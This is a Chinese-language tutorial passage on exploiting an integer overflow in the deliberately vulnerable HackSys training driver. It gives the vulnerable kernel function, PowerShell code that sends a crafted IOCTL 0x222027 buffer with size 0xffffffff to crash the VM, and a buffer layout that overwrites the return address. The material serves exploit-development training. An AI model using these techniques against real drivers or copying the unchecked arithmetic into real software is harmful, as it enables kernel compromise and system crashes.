
```
NTSTATUS TriggerIntegerOverflow(IN PVOID UserBuffer, IN SIZE_T Size) {

    ULONG Count = 0;

    NTSTATUS Status = STATUS_SUCCESS;

    ULONG BufferTerminator = 0xBAD0B0B0;

    ULONG KernelBuffer[BUFFER_SIZE] = {0};

    SIZE_T TerminatorSize = sizeof(BufferTerminator);



    PAGED_CODE();



    __try {

        // Verify if the buffer resides in user mode

        ProbeForRead(UserBuffer, sizeof(KernelBuffer), (ULONG)__alignof(KernelBuffer));



        DbgPrint("[+] UserBuffer: 0x%p\n", UserBuffer);

        DbgPrint("[+] UserBuffer Size: 0x%X\n", Size);

        DbgPrint("[+] KernelBuffer: 0x%p\n", &KernelBuffer);

        DbgPrint("[+] KernelBuffer Size: 0x%X\n", sizeof(KernelBuffer));



#ifdef SECURE

        // Secure Note: This is secure because the developer is not doing any arithmetic

        // on the user supplied value. Instead, the developer is subtracting the size of

        // ULONG i.e. 4 on x86 from the size of KernelBuffer. Hence, integer overflow will

        // not occur and this check will not fail

        if (Size > (sizeof(KernelBuffer) - TerminatorSize)) {

            DbgPrint("[-] Invalid UserBuffer Size: 0x%X\n", Size);



            Status = STATUS_INVALID_BUFFER_SIZE;

            return Status;

        }

#else

        DbgPrint("[+] Triggering Integer Overflow\n");



        // Vulnerability Note: This is a vanilla Integer Overflow vulnerability because if

        // 'Size' is 0xFFFFFFFF and we do an addition with size of ULONG i.e. 4 on x86, the

        // integer will wrap down and will finally cause this check to fail

        if ((Size + TerminatorSize) > sizeof(KernelBuffer)) {

            DbgPrint("[-] Invalid UserBuffer Size: 0x%X\n", Size);



            Status = STATUS_INVALID_BUFFER_SIZE;

            return Status;

        }

#endif



        // Perform the copy operation

        while (Count < (Size / sizeof(ULONG))) {

            if (*(PULONG)UserBuffer != BufferTerminator) {

                KernelBuffer[Count] = *(PULONG)UserBuffer;

                UserBuffer = (PULONG)UserBuffer + 1;

                Count++;

            }

            else {

                break;

            }

        }

    }

    __except (EXCEPTION_EXECUTE_HANDLER) {

        Status = GetExceptionCode();

        DbgPrint("[-] Exception Code: 0x%X\n", Status);

    }



    return Status;

}
```

驱动函数比较了用户提供的缓冲区长度和驱动分配缓冲区的长度。然而在有漏洞的版本中，这一检查的执行是这样的：

```
BufferTerminator = 0xBAD0B0B0

InputBuffer.Size + BufferTerminator.Size > KernelAllocatedBuffer.Size
```

很明显的bug，terminator的大小是4字节，所以如果我们通过 `DeviceIoCtrl` 给驱动提供一个大小在 `0xfffffffc` 到 `0xffffffff` 的缓冲区的话，整数会溢出并借此通过了这一检查！我们可以在 PowerShell 控制台中做相似的操作来展示这一问题。

```
PS C:\Users\b33f> 0xfffffffc+4

0

PS C:\Users\b33f> 0xffffffff+4

3
```

该函数的 IOCTL 码为 `0x222027`。可以参考本系列教程的第十和第十一部分来查看 IOCTL 码是如何获取的。快速跳入 IDA，看看这个函数。下图中我们可以看到函数的开头存在着错误的长度检查。

![](https://bbs.kanxue.com/upload/attach/201803/530966_J5NRDCJJ3HH83EP.jpg)

跳过这块代码，我们会进入一个循环，它将拷贝用户缓冲区的数据岛内核缓冲区。注意下面的橘色块，拷贝操作将一直持续下去直到遇到缓冲区终止标志 `DWORD`（译者注：其实就是 `0xbad0b0b0`）。

![](https://bbs.kanxue.com/upload/attach/201803/530966_BNAPZFA782QJQGF.jpg)

简单的填充一些期望值给缓冲区，保证我们可以调用到相关函数。

```
Add-Type -TypeDefinition @"

using System;

using System.Diagnostics;

using System.Runtime.InteropServices;

using System.Security.Principal;



public static class EVD

{

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]

    public static extern IntPtr CreateFile(

        String lpFileName,

        UInt32 dwDesiredAccess,

        UInt32 dwShareMode,

        IntPtr lpSecurityAttributes,

        UInt32 dwCreationDisposition,

        UInt32 dwFlagsAndAttributes,

        IntPtr hTemplateFile);



    [DllImport("Kernel32.dll", SetLastError = true)]

    public static extern bool DeviceIoControl(

        IntPtr hDevice,

        int IoControlCode,

        byte[] InBuffer,

        int nInBufferSize,

        byte[] OutBuffer,

        int nOutBufferSize,

        ref int pBytesReturned,

        IntPtr Overlapped);

}

"@



$hDevice = [EVD]::CreateFile("\\.\HacksysExtremeVulnerableDriver", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)



if ($hDevice -eq -1) {

    echo "`n[!] Unable to get driver handle..`n"

    Return

} else {

    echo "`n[>] Driver information.."

    echo "[+] lpFileName: \\.\HacksysExtremeVulnerableDriver"

    echo "[+] Handle: $hDevice"

}



$Buffer = [Byte[]](0x41)*0x100 + [System.BitConverter]::GetBytes(0xbad0b0b0)

echo "`n[>] Sending buffer.."

echo "[+] Buffer length: $($Buffer.Length)"

echo "[+] IOCTL: 0x222027`n"

[EVD]::DeviceIoControl($hDevice, 0x222027, $Buffer, $Buffer.Length, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null
```

![](https://bbs.kanxue.com/upload/attach/201803/530966_8RHTX8A7R8U4RAY.jpg)

完美。现在，尝试传递一个大小为 `0xffffffff`（`size`）、尺寸大于驱动分配的缓冲区大小（例如 `0x900`）的缓冲区给 `DeviceIoControl`，来引发一个虚拟机蓝屏。

```
Add-Type -TypeDefinition @"

using System;

using System.Diagnostics;

using System.Runtime.InteropServices;

using System.Security.Principal;



public static class EVD

{

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]

    public static extern IntPtr CreateFile(

        String lpFileName,

        UInt32 dwDesiredAccess,

        UInt32 dwShareMode,

        IntPtr lpSecurityAttributes,

        UInt32 dwCreationDisposition,

        UInt32 dwFlagsAndAttributes,

        IntPtr hTemplateFile);



    [DllImport("Kernel32.dll", SetLastError = true)]

    public static extern bool DeviceIoControl(

        IntPtr hDevice,

        int IoControlCode,

        byte[] InBuffer,

        int nInBufferSize,

        byte[] OutBuffer,

        int nOutBufferSize,

        ref int pBytesReturned,

        IntPtr Overlapped);

}

"@



$hDevice = [EVD]::CreateFile("\\.\HacksysExtremeVulnerableDriver", [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::ReadWrite, [System.IntPtr]::Zero, 0x3, 0x40000080, [System.IntPtr]::Zero)



if ($hDevice -eq -1) {

    echo "`n[!] Unable to get driver handle..`n"

    Return

} else {

    echo "`n[>] Driver information.."

    echo "[+] lpFileName: \\.\HacksysExtremeVulnerableDriver"

    echo "[+] Handle: $hDevice"

}



$Buffer = [Byte[]](0x41)*0x900 + [System.BitConverter]::GetBytes(0xbad0b0b0)

$Size = 0xffffffff

echo "`n[>] Sending buffer.."

echo "[+] Buffer length: $($Buffer.Length)"

echo "[+] IOCTL: 0x222027`n"

[EVD]::DeviceIoControl($hDevice, 0x222027, $Buffer, $Size, $null, 0, [ref]0, [System.IntPtr]::Zero) |Out-null
```

![](https://bbs.kanxue.com/upload/attach/201803/530966_772FRE2XQDRN4RV.jpg)

## Pwn

如前所见，我们崩溃在了异常处理例程。这并不完全可信，我们真正想要做的是一个宝贵的覆盖以致于当 `TriggerIntegerOverflow` 函数退出时可以获取执行体的控制。

我将此任务留给勤勉的读者。我给后来人“发明”了一些粗糙的 Powershell 代码来做这个 exp 开发，下面的代码可以用来创建一个模式缓冲区（pattern buffer）。

```
$Pattern_Create = ([system.Text.Encoding]::ASCII).GetBytes("Aa0Aa1Aa2Aa3Aa........")
```

覆盖函数的返回值为 `0x42424242`，我们可以使用下面的结构。

```
$Buffer = [Byte[]](0x41)*0x828 + [Byte[]](0x42)*0x4 + [System.BitConverter]::GetBytes(0xbad0b0b0)

$Size = 0xffffffff
```

与内核栈溢出类似，我们得看看要如何修改 shellcode 的尾部来防止一个 BSOD！首先让我们看看正常的执行流如何执行。我们在 `TriggerIntegerOverflow` 返回指令下一个断点。

![](https://bbs.kanxue.com/upload/attach/201803/530966_PV65BNXU7QAP6YS.jpg)
